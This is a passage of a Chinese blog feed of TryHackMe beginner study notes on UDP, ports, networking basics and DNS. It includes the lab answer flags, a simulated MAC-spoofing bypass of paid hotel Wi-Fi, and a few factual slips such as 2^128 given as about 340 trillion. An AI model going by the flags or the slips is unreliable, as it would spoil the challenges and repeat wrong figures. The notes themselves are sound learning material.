<p>UDP主要用于应用程序可以容忍数据丢失的情况下(如视频流程序或语音聊天程序)，下面是对UDP协议的优缺点比较：</p>
<ul>
<li>UDP的优点：UDP比TCP快得多；UDP让应用层(用户软件)决定是否控制数据包的发送速度；UDP不像TCP那样在设备上保留连续连接。</li>
<li>UDP的缺点：UDP不关心发送的数据是否成功被接收，容易发生数据丢失；UDP这种不稳定的数据传输方式可能会给用户糟糕的体验。</li>
</ul>
<p>如前所述，在两台设备之间建立UDP连接时不会发生任何过程，这意味着UDP不考虑数据是否被接收，也没有TCP所提供的保护措施（例如保护数据完整性）。</p>
<p>UDP数据包比TCP数据包简单得多，并且有更少的标头，然而，这两个协议也能共享一些标准的标头，如下所示：</p>
<ul>
<li>Time to Live (TTL-生存时间)：该字段为数据包设置了一个过期计时器，即使数据包永远无法到达目标主机，这也不会阻塞你的网络。</li>
<li>Source Address(源地址)：发送数据包的设备的IP地址，以便数据知道返回到哪里。</li>
<li>Destination Address(目标地址)：数据包要发送到的设备的IP地址，以便数据知道下一步要传输到哪里。</li>
<li>Source Port(源端口)：此值是发送方为发送TCP数据包而打开的端口，该端口号的值是随机选择的(从0-65535之间 选择尚未被使用的端口)。</li>
<li>Destination Port(目标端口)：远程主机（接收数据的主机）上运行的应用程序或服务的端口号，例如，默认运行 Web 服务器的端口 80；与源端口不同，目标端口号并不是随机选择的。</li>
<li>Data(数据)：这个标头是存储数据的地方，所存储的是正在传输的文件的字节。</li>
</ul>
<p>通过UDP通信与通过TCP通信的过程是不同的，我们应该记住UDP协议是无状态的，在UDP传输数据期间并不会发送确认数据包（ACK）</p>
<p>下图显示了Alice和Bob之间的正常UDP通信，在现实生活中，UDP通信过程将发生在两个设备之间。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326234005977.png"
                      alt="image-20230326234005977"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230326234125159.png"
                      alt="image-20230326234125159"
                ></p>
<h2 id="端口基础介绍-相关实例练习"><a href="#端口基础介绍-相关实例练习" class="headerlink" title="端口基础介绍&amp;相关实例练习"></a>端口基础介绍&amp;相关实例练习</h2><p><strong>端口基础介绍</strong></p>
<p>Port(端口)是数据进行交换的关键点，Port也有港口的含义，此名称或许恰如其分；你可以想象在海边有一个又一个港口，所有想要靠岸停放的船舶都必须前往与船舶尺寸和船舶用途相匹配的港口，例如，一艘游轮不能停靠在为渔船而建造的港口处，反之亦然。</p>
<p>这些端口会规定什么服务才可以使用什么端口号——如果某个服务和某个端口不兼容，就不能为该服务分配此端口；网络设备在相互通信时也将使用端口来执行一些严格的规则，当两个设备建立起连接之后，设备所发送或接收的任何数据都将通过端口进行通信。</p>
<p>在计算机中，端口号所对应的是 0 到 65535 之间的数值。</p>
<p>由于端口的范围可以是0-65535之间的任何数值，因此很快就会出现难以跟踪哪个应用程序正在使用哪个端口的风险，值得庆幸的是，我们能够将应用程序、软件和行为与一组标准规则相关联；例如，通过强制任何web浏览器的数据都必须通过端口80发送，软件开发人员可以设计出多种使用80端口进行通信的web浏览器，如Chrome浏览器、Firefox浏览器等，而这些浏览器最终都能以相同的方式解释数据。</p>
<p>这意味着现在所有的浏览器都有一个共同的标准规则——通过80端口发送数据；但是浏览器的外观、使用感觉和易用性则取决于设计师或用户的个人选择。</p>
<p>除了web浏览器的标准规则是“使用端口80进行通信”之外，其他一些协议也已经分配了对应的标准规则，接下来我们将探讨 和一些其他协议相对应的标准规则：</p>
<p><em>tips：任何在 0 到 1024 之间的端口都被称为普通端口。</em></p>
<ul>
<li><strong>F</strong>ile <strong>T</strong>ransfer <strong>P</strong>rotocol (<strong>FTP</strong>协议)：文件传输协议；默认使用21端口；此协议用于构建在客户机-服务器(C&#x2F;S)模型上的文件共享应用程序，这意味着你可以从FTP服务器上下载文件。</li>
<li><strong>S</strong>ecure <strong>Sh</strong>ell (<strong>SSH</strong>协议)：安全外壳协议；默认使用22端口；该协议可用于通过基于文本的管理界面安全地登录目标系统。</li>
<li><strong>H</strong>yper<strong>T</strong>ext Transfer Protocol (<strong>HTTP</strong>协议)：超文本传输协议；默认使用80端口；这个协议为万维网(WWW)提供了基础，你的浏览器能够使用该协议来访问或者下载网页上的文本、图像和视频等资源。</li>
<li><strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol <strong>S</strong>ecure (<strong>HTTPS</strong>协议)：超文本传输安全协议；默认使用443端口；该协议与HTTP协议相同，但是另外还增加了安全加密特性。</li>
<li><strong>S</strong>erver <strong>M</strong>essage <strong>B</strong>lock (<strong>SMB</strong>协议)：服务器消息块协议，是一种网络文件系统访问协议；默认使用445端口；该协议类似于文件传输协议(FTP)，但是，除了文件之外，SMB协议还允许你共享打印机等设备。</li>
<li><strong>R</strong>emote <strong>D</strong>esktop <strong>P</strong>rotocol (<strong>RDP</strong>协议)：远程桌面协议；默认使用3389端口；该协议是一种使用可视桌面界面登录目标系统的安全方法(与SSH协议基于文本界面的限制不同)。</li>
</ul>
<p>我们在此只是简单地介绍了网络安全中的一些常见协议，你可以在以下链接中找到1024个常用端口列表：</p>
<blockquote>
<p><a class="link"   href="http://www.vmaxx.net/techinfo/ports.htm" >http://www.vmaxx.net/techinfo/ports.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>注意：上述这些协议只是默认会遵循标准规则来使用端口，也就是说，你其实可以在不同的端口上来管理与协议交互的应用程序，而不只是使用标准端口(比如在8080端口上而不是在80标准端口上运行web服务器)；但是应用程序将假定遵循标准规则来使用端口，因此你在通过浏览器访问目标服务器时——必须在URL的最后提供冒号(:)并加上具体的端口号。</p>
<p><strong>实例练习</strong></p>
<p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><strong>答题</strong></p>
<p><em>tips：通过端口“1234”连接到目标IP地址“8.8.8.8”，最后将收到一个flag。</em></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327011252012.png"
                      alt="image-20230327011252012" style="zoom:67%;" 
                >

<blockquote>
<p>最后得到的flag是：THM{YOU_CONNECTED_TO_A_PORT} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230327011307845.png"
                      alt="image-20230327011307845"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-What is Networking？(什么是网络？)-学习</title>
    <url>/2024/01/18/THM-What%20is%20Networking%EF%BC%9F(%E4%BB%80%E4%B9%88%E6%98%AF%E7%BD%91%E7%BB%9C%EF%BC%9F)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/whatisnetworking" >https://tryhackme.com/room/whatisnetworking <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：学习一些关于计算机网络的基础知识。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>网络是连接在一起的东西，例如，你的朋友圈：你们都因为相似的兴趣、爱好、技能和类型而联系在一起。</p>
<p>网络可以在各行各业中找到:</p>
<ul>
<li>城市公共交通系统</li>
<li>国家电网等基础设施</li>
<li>你和邻居会见和互相问候</li>
<li>邮寄信件和包裹的邮政系统</li>
</ul>
<p>在计算机领域，网络的概念和上述例子类似，只是分散到了各个技术设备上；以你的手机为例，你拥有它的原因是为了获取东西。我们将介绍这些设备如何相互通信以及它们遵循什么规则。</p>
<p>在计算机领域，一个网络可以由2个到数十亿个设备组成，这些设备包括你的笔记本电脑和手机，安全摄像头，交通信号灯，甚至农场。</p>
<p>网络已经融入了我们的日常生活，无论是收集天气数据，还是为家庭供电，甚至是确定谁在道路上有优先通行权都和网络有所关联；由于网络是嵌入在现代社会中的，所以网络也是网络安全中必须掌握的一个基本概念。</p>
<p>以下图为例，Alice, Bob和Jim已经组成了他们的网络。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325111701678.png"
                      alt="image-20230325111701678"
                ></p>
<p>网络有各种各样的形状和大小，这也是我们将在本文中讨论的内容。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325111758447.png"
                      alt="image-20230325111758447"
                ></p>
<h2 id="什么是互联网？"><a href="#什么是互联网？" class="headerlink" title="什么是互联网？"></a>什么是互联网？</h2><p>现在我们已经了解了什么是网络，以及在计算机中网络是如何定义的(在计算机领域：网络表示多个连接的设备)，让我们来探索什么是互联网。</p>
<p>互联网是一个巨大的网络，它由许许多多小网络组成。基于上一小节中的例子，现在让我们想象 Alice 交了一些名叫 Zayn 和 Toby 的新朋友，她想把他们介绍给Bob和Jim，而问题是Alice是唯一一个和Zayn和Toby说同一种语言的人，所以Alice必须成为传达信息的信使。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325112358537.png"
                      alt="image-20230325112358537"
                ></p>
<p>因为Alice会说两种语言，上图中的其他人可以通过Alice实现互相交流——这从而形成一个新的网络。</p>
<p>互联网的第一次迭代是在20世纪60年代末的 ARPANET 项目中，该项目由美国国防部资助，是第一个记录在案的计算机网络；然而，直到1989年，蒂姆·伯纳斯·李 才通过创建万维网(WWW-<strong>W</strong>orld <strong>W</strong>ide <strong>W</strong>eb) 发明了我们现在所知道的互联网，至此，互联网才开始被用作存储和共享信息的存储库(就像今天一样)。</p>
<p>让我们将上面例子中的Alice的朋友网络与计算机设备联系起来，互联网看起来将像下面这类图表的放大版:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325113424671.png"
                      alt="image-20230325113424671"
                ></p>
<p>如前所述，互联网是由许多小型网络连接在一起组成的；这些小网络被称为专用网络(private networks)，连接这些小网络的网络被称为公共网络(private networks)——也就是Internet 。所以，我们可以概括得出，计算机网络可以是以下两种类型之一：</p>
<ul>
<li>Private network（专用网络）</li>
<li>Public network（公共网络）</li>
</ul>
<p>tips：在网络上，计算机设备将使用一组标签来标识自己。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325114031504.png"
                      alt="image-20230325114031504"
                ></p>
<h2 id="识别网络上的设备"><a href="#识别网络上的设备" class="headerlink" title="识别网络上的设备"></a>识别网络上的设备</h2><p>为了通信和维持秩序，网络上的设备必须具有识别性和可识别性，如果你都不知道你在和谁说话，那么网络又有什么用呢?</p>
<p>计算机网络中的设备与人类非常相似，人类有两种被识别的方式:</p>
<ul>
<li>名字</li>
<li>指纹</li>
</ul>
<p>我们可以改变名字，但是我们不能改变指纹，每个人都有自己的一套指纹，这意味着即使改了名字，我们仍然有唯一的身份标识；在网络中的计算机设备具有类似的被识别方式：</p>
<ul>
<li>IP地址</li>
<li>媒体访问控制(MAC-Media Access Control)地址——可以把它看作是一个类似于序列号的地址。</li>
</ul>
<h3 id="IP-Addresses"><a href="#IP-Addresses" class="headerlink" title="IP Addresses"></a><strong>IP Addresses</strong></h3><p>简单地说，IP地址(或Internet协议)可以在一段时间内用作识别网络上的主机的方式，然后该IP地址也可以（在前一个设备使用该IP地址的时间过期后）与另一个设备相关联，而不会使IP地址发生改变。</p>
<p>让我们精确地划分IP地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325182903071.png"
                      alt="image-20230325182903071"
                ></p>
<p>IP地址是一组共32位的二进制数字，可分为4个8位二进制数，这些 <u>8位二进制数(<em><strong>octet</strong></em>)</u> 的值将被汇总为网络设备的IP地址；这组数字是通过被称为 IP 寻址和子网划分的技术计算出来的，此处需要理解的重点是：IP 地址可以因设备而异，但不能在同一个网络中同时被多个设备使用。</p>
<p>tips：一个字节由8个二进制位组成，所以一个IPv4地址共四个字节。</p>
<p>IP地址遵循一组被称为协议的标准，这些协议是网络的主干，迫使许多设备使用同一种语言进行通信；设备既可以在私有网络（专用网络）上，也可以在公共网络上。根据设备所处的位置，将决定它们所拥有的IP地址类型：公共IP地址或者私有IP地址。</p>
<p>公共地址可用于在Internet上识别设备，而私有地址可用于在其他设备之中识别设备。以下面的表格和截图为例，假如我们有两个设备在专用网络（私有网络）上:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325185159663.png"
                      alt="image-20230325185159663"
                ></p>
<p>以上两台设备将能够使用它们的私有IP地址相互通信，但是，从这两台设备发送到Internet的任何数据都将被相同的公共IP地址识别。公共IP地址可由你的互联网服务提供商(ISP-Internet Service Provider)提供，并且按月收费。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325185615792.png"
                      alt="image-20230325185615792"
                ></p>
<p>随着越来越多的设备联网，想要获得一个未被使用的公共地址也变得越来越难。根据网络行业巨头思科公司的估计，到2021年底，将有大约500亿台设备连接到互联网(<a class="link"   href="https://www.cisco.com/c/dam/en_us/about/ac79/docs/innov/IoT_IBSG_0411FINAL.pdf" >思科, 2021 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)。但是IP地址不止一个版本，到目前为止，我们只讨论了一个版本的互联网协议寻址方案，即 IPv4 ，它使用的是一个具有2^32(42.9亿)个IP地址的编号系统。</p>
<p>IPv6是互联网协议寻址方案的新迭代版本，能够帮助解决IP地址短缺的问题，IPv6有一些好处：</p>
<ul>
<li>支持最多2^128(340万亿+)个IP地址，有助于解决IPv4面临的地址短缺问题。</li>
<li>由于采用了新的方法，IPv6的效率更高。</li>
</ul>
<p>下面的截图显示了IPv6地址和IPv4地址的实例：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325191000099.png"
                      alt="image-20230325191000099"
                ></p>
<h3 id="MAC-Addresses"><a href="#MAC-Addresses" class="headerlink" title="MAC Addresses"></a><strong>MAC Addresses</strong></h3><p>网络上的设备都有一个物理网络接口，和接口对应的是该设备主板上的一个微型芯片板；设备的物理网络接口会由制造芯片的工厂分配一个唯一的地址，此地址被称为MAC(媒体访问控制-<strong>M</strong>edia <strong>A</strong>ccess <strong>C</strong>ontrol)地址。MAC地址是一个具有十二个字符的十六进制数字(十六进制：是一种以16为基数的数字系统，可用于在计算机中表示数字)，每一位十六进制的数字都代表两个字符，在具体表示十六进制数时会用冒号分隔，这些冒号是分隔符，例如：<code>a4:c3:f0:85:ac:2d</code>。</p>
<p>MAC地址的前六个字符（前三位MAC地址）代表制作物理网络接口的公司，MAC地址的后六个字符则是唯一的数字。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325192759185.png"
                      alt="image-20230325192759185"
                ></p>
<p>然而，关于MAC地址的一个有趣的事是，它们可以被伪造或“欺骗”。当一台联网设备使用MAC地址伪装成另一台设备时，就会发生MAC地址欺骗，当MAC地址欺骗发生时，通常会破坏一些实现得很差的安全设计，这些（安全性差的）安全设计会假设在网络上通信的设备是可信的。以下面的场景为例：如果防火墙已被配置为允许管理员 MAC 地址之间发生任何通信，如果一个设备伪造或“欺骗”管理员的MAC地址，防火墙就会认为它正在接收来自管理员的通信（而实际上并没有）。</p>
<p>咖啡馆和酒店等场所在使用“Guest”或“Public”Wi-Fi时经常会使用MAC地址进行控制，这种配置可以提供更好的服务，也就是说，如果你愿意为每台设备支付费用，就可以以一定的价格获得更快的连接。</p>
<h3 id="答题"><a href="#答题" class="headerlink" title="答题"></a><strong>答题</strong></h3><p>在和本文相关的TryHackMe实验房间中 部署交互式实验环境并回答下面问题。</p>
<p><em>tips：此交互式实验环境模拟了酒店的Wi-Fi网络，你必须为上网服务付费。你可以注意到路由器不允许Bob的数据包(蓝色)进入TryHackMe网站，并将这些数据包放入垃圾箱中，但是Alice的数据包(绿色)却可以通过，因为Alice已经支付了使用Wi-Fi所需的费用；现在我们尝试将Bob的MAC地址更改为与Alice的MAC地址相同，看看会发生什么事情。</em></p>
<p>正常的通信情况：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325200205269.png"
                      alt="image-20230325200205269" style="zoom:50%;" 
                >

<p>伪装MAC地址进行通信：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230325200413832.png"
                      alt="image-20230325200413832" style="zoom:50%;" 
                >

<p>得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325200323536.png"
                      alt="image-20230325200323536"
                ></p>
<blockquote>
<p>最后得到的flag为：THM{YOU_GOT_ON_TRYHACKME} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325200012653.png"
                      alt="image-20230325200012653"
                ></p>
<h2 id="关于Ping-ICMP"><a href="#关于Ping-ICMP" class="headerlink" title="关于Ping (ICMP)"></a>关于Ping (ICMP)</h2><p>Ping是我们可用的最基本的网络工具之一。Ping使用ICMP (Internet Control Message Protocol)报文来判断设备之间连接的性能，例如连接是否存在或者连接是否可靠。</p>
<p>如下面的截图所示，ICMP报文在设备之间传输所花费的时间可通过ping来测量；这种测量是使用 ICMP 的回波数据包(echo packet)和来自目标设备的 ICMP 回波应答(echo reply)来完成的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325115450514.png"
                      alt="image-20230325115450514"
                ></p>
<p>Ping可以针对网络上的设备执行，例如你的家庭网络或者网站等资源。ping工具易于使用，并能安装在Linux和Windows等操作系统上，执行 ping 命令的简单语法是 <code>ping IP address or website URL</code> 。</p>
<p>基于上面的ping命令示例截图：我们正在ping一个私有地址为192.168.1.254的设备，我们可以看到已发送了6个ICMP数据包（手动按ctrl+c按键停止ping命令），所有这些数据包是在平均5.3秒的时间内收到的。</p>
<p><strong>答题</strong></p>
<p>在和本文相关的TryHackMe实验房间中部署实验环境并回答下面问题。</p>
<p><em>tips：在部署的实验环境中对地址“8.8.8.8”使用ping命令。</em></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325120527199.png"
                      alt="image-20230325120527199"
                ></p>
<blockquote>
<p>执行ping命令得到的flag为：THM{I_PINGED_THE_SERVER} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230325120413513.png"
                      alt="image-20230325120413513"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-DNS in detail(DNS基础详解)-学习</title>
    <url>/2024/01/21/THM-DNS%20in%20detail(DNS%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/dnsindetail" >https://tryhackme.com/room/dnsindetail <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解DNS协议是如何工作的，以及DNS如何帮助我们访问互联网服务。</p>
<h2 id="什么是DNS？"><a href="#什么是DNS？" class="headerlink" title="什么是DNS？"></a>什么是DNS？</h2><p>DNS 指 Domain Name System，即域名系统，DNS能为我们提供一种简单的方式来与互联网上的设备进行通信，而不需要记住复杂的IP地址。</p>
<p>就像每个家庭都有一个唯一的地址能够用来直接发送和接收邮件一样，互联网上的每台计算机也都有自己唯一的地址能够用于通信，这个地址被称为IP地址。</p>
<p>IP地址的格式如下：104.26.10.229，主要由4组0 ~ 255的二进制数字组成，中间用英文句点号隔开。当你想用浏览器来访问一个网站时，选择记住和目标网站相对应的那组复杂的IP地址 可能并不太方便，这就是DNS可以帮助我们的地方。在使用了DNS协议之后，我们就不需要记住类似于 104.26.10.229 的IP地址，而是可以选择记住和IP地址对应的域名如：tryhackme.com 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327231452919.png"
                      alt="image-20230327231452919"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327231521741.png"
                      alt="image-20230327231521741"
                ></p>
<h2 id="域层次结构"><a href="#域层次结构" class="headerlink" title="域层次结构"></a>域层次结构</h2><p><strong>Domain Hierarchy示意图</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327233305530.png"
                      alt="image-20230327233305530"
                ></p>
<p><strong>Top-Level Domain(TLD-顶级域)</strong></p>
<p>TLD指的是域名最右边的部分，例如，tryhackme.com的顶级域名是.com；TLD有两种类型，包括gTLD(通用顶级域)和ccTLD(国家代码顶级域)。</p>
<p>在计算机历史上，通用顶级域名主要用于告诉用户“域名的用途”，例如，.com用于商业目的，.org用于组织，.edu用于教育，.gov用于政府；而ccTLD的用途是表示地理位置，例如.ca表示位于加拿大的网站，.co.uk表示位于英国的网站等等。基于用户需求，新的通用顶级域名在大量涌入，包括.online，.club，.website，.biz等等。</p>
<p>要查看超过2000个顶级域名的完整列表，请访问以下链接：</p>
<p><a class="link"   href="https://data.iana.org/TLD/tlds-alpha-by-domain.txt" >https://data.iana.org/TLD/tlds-alpha-by-domain.txt <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><em>tips：gTLD - Generic Top Level、ccTLD - Country Code Top Level Domain 。</em></p>
<p><strong>Second-Level Domain(二级域)</strong></p>
<p>以tryhackme.com为例，.com部分是TLD，tryhackme部分则是二级域名。在进行域名注册时，二级域名被限制最长可使用63个字符+顶级域名(TLD)，在具体的二级域名部分只能使用”<code>a-z</code>“、”<code>0-9</code>“和连字符”<code>-</code>“(不能以连字符开头或结尾，也不能使用连续的连字符)。</p>
<p><strong>Subdomain(子域)</strong></p>
<p>在一个完整的域名中，子域位于二级域的左侧，两者之间将使用英文句点分隔，例如，在一个域名 admin.tryhackme.com 中，admin部分就是子域。</p>
<p>子域名的创建限制与二级域名相同，都被限制为最长可用63个字符，并且同样只能使用A -z 0-9和连字符(不能以连字符开头或结尾或使用连续连字符)。</p>
<p>在一个域名中，我们可以同时使用多个子域，只要用英文句点分隔即可，由此我们便能创建一个较长的域名，例如 jupiter.servers.tryhackme.com ，但是域名的整体长度必须控制在253个字符以内，也就是说：在域名整体长度没超过限制的情况下，我们可以为一个域名创建多个子域名且无数量限制。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230328001000917.png"
                      alt="image-20230328001000917"
                ></p>
<h2 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h2><p>我们已经知道DNS可用于寻找目标网站，此外，还存在多种类型的DNS记录，接下来我们将介绍一些常见的DNS记录类型。</p>
<p><strong>A 记录</strong></p>
<p>此类DNS记录将被解析为IPv4地址，例如：<code>104.26.10.229</code></p>
<p><strong>AAAA 记录</strong></p>
<p>此类DNS记录将被解析为IPv6地址，例如：<code>2606:4700:20::681a:be5</code></p>
<p><strong>CNAME 记录</strong></p>
<p>此类DNS记录将被解析到另一个域名，例如，TryHackMe的在线商店有一个子域名store.tryhackme.com，它能返回一个CNAME记录shops.shopify.com，然后再向shops.shopify.com发出另一个DNS请求，就能计算出相关的IP地址。</p>
<p><strong>MX 记录</strong></p>
<p>此类DNS记录将被解析为 处理你正在查询的域的电子邮件服务器地址，例如 tryhackme.com 的MX记录响应可能为 alt1.aspmx.l.google.com ；这类记录还会带有一个优先级值，此值将告诉客户端以什么顺序来尝试访问电子邮件服务器，如果主电子邮件服务器宕机，则可以将电子邮件发送到备份电子邮件服务器。</p>
<p><strong>TXT 记录</strong></p>
<p>TXT记录是自由文本字段，任何基于文本的数据都可以存储在其中。TXT记录有多种用途，一些常见的用途是 列出有权代表域发送电子邮件的服务器(这可以帮助对抗垃圾邮件和钓鱼邮件)，TXT记录还可用于 在注册第三方服务时验证域名的所有权。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230328003618226.png"
                      alt="image-20230328003618226"
                ></p>
<h2 id="发出DNS请求"><a href="#发出DNS请求" class="headerlink" title="发出DNS请求"></a>发出DNS请求</h2><p><strong>当你发出DNS请求时会发生什么？</strong></p>
<ol>
<li>当你请求一个域名时，你的计算机首先会检查它自身的本地缓存，看看你最近是否查询过这个地址(即查看缓存中是否已经为目标网站存储了一个相关的 IP 地址)，如果发现本地缓存中无相关记录，你的计算机则将向递归(<em><strong>recursive</strong></em>)DNS服务器发送DNS请求。</li>
<li>递归DNS服务器通常会由你的Internet 服务提供商(即ISP，在中国是移动、联通等)提供，但你也可以选择一些其他的递归DNS服务器。递归DNS服务器会带有一个关于“最近查找过的域名”的本地缓存，如果在此缓存中找到结果，则相关的信息将被发送回你的计算机，你的DNS请求也会在这里结束(这种域名请求情况对于谷歌、Facebook、Twitter等受欢迎以及域名请求频率很高的网站服务来说很常见)。如果在递归DNS服务器的本地缓存中无法找到域名请求的结果，接下来就会开始从互联网的根DNS服务器尝试寻找关于域名请求的正确答案。</li>
<li>根DNS服务器是互联网的DNS主干，它们的工作是将域名请求重定向到正确的顶级域服务器，重定向的结果取决于你的域名请求内容：例如，如果你请求<a class="link"   href="http://www.tryhackme.com,那么根dns服务器将识别到.com的顶级域名,并会将你指向处理.com地址的正确tld(顶级域)服务器./" >www.tryhackme.com，那么根DNS服务器将识别到.com的顶级域名，并会将你指向处理.com地址的正确TLD(顶级域)服务器。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>TLD服务器会保存“在哪里能找到响应DNS请求的权威服务器”的记录。权威服务器通常也被称为域的名称服务器，例如<a class="link"   href="http://www.tryhackme.com/" >www.tryhackme.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的名称服务器是<code>kip.ns.cloudflare.com</code>和<code>uma.ns.cloudflare.com</code>，一个域名可能会有多个域名服务器，这是为了形成备份以防宕机。（简而言之：当 TLD 服务器收到我们的域名请求时，TLD服务器会将域名请求信息传递给适当的权威名称服务器，而权威名称服务器主要用于直接存储域的 DNS 记录）</li>
<li>权威DNS服务器是负责存储特定域名的DNS记录的服务器，并且能对所存储的DNS记录进行及时更新。基于DNS记录的不同类型会有多条DNS记录内容，而这些与你的域名请求相关的DNS记录都存储在权威DNS服务器中，当域名请求到达权威DNS服务器之后，权威DNS服务器会将这些与你的域名请求相关的DNS记录 发送回递归DNS服务器，递归DNS服务器将会为这些DNS记录缓存一个本地副本 以备将来的请求所需，然后这些DNS记录将被转发回 发出域名请求的原始客户端机器。</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230328113758899.png"
                      alt="image-20230328113758899"
                ></p>
<p>Tips：每个DNS记录都会带有一个TTL（Time To Live-生存时间）值，这个值是一个以秒表示的数字，所有不超过TTL时间的DNS记录都会持续存储在计算机的本地缓存中，如果本地缓存中的DNS记录过期，那么在下次请求域名时，你可能需要再次获取相关的DNS记录（这将重复上述过程）。通过使用计算机本地缓存中的DNS记录——可以节省每次与目标服务器进行通信时 所消耗的DNS请求响应时间。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230328003958971.png"
                      alt="image-20230328003958971"
                ></p>
<h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>在和本文相关的TryHackMe实验房间中部署实验环境并回答问题。</p>
<p><em>tips：在模拟界面构建请求以进行DNS查询并查看结果。</em></p>
<p>查询 shop.website.thm 的CNAME记录：<code>nslookup --type=CNAME shop.website.thm</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327232336558.png"
                      alt="image-20230327232336558"
                ></p>
<blockquote>
<p>shop.website.thm 的CNAME记录是：shops.myshopify.com 。</p>
</blockquote>
<p>查询 website.thm 的TXT记录：<code>nslookup --type=TXT website.thm</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327232618617.png"
                      alt="image-20230327232618617"
                ></p>
<blockquote>
<p>website.thm 的TXT记录是：THM{7012BBA60997F35A9516C2E16D2944FF} 。</p>
</blockquote>
<p>查看 website.thm 的MX记录的数字优先级值：<code>nslookup --type=MX website.thm</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327232832550.png"
                      alt="image-20230327232832550"
                ></p>
<blockquote>
<p>website.thm 的MX记录的数字优先级值为：30 。</p>
</blockquote>
<p>查看 website.thm 的A记录的IP地址：<code>nslookup --type=A website.thm</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327233114182.png"
                      alt="image-20230327233114182"
                ></p>
<blockquote>
<p>website.thm 的A记录的IP地址为：10.10.10.10 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230327233202973.png"
                      alt="image-20230327233202973"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-HTTP in detail(HTTP协议介绍)-学习</title>
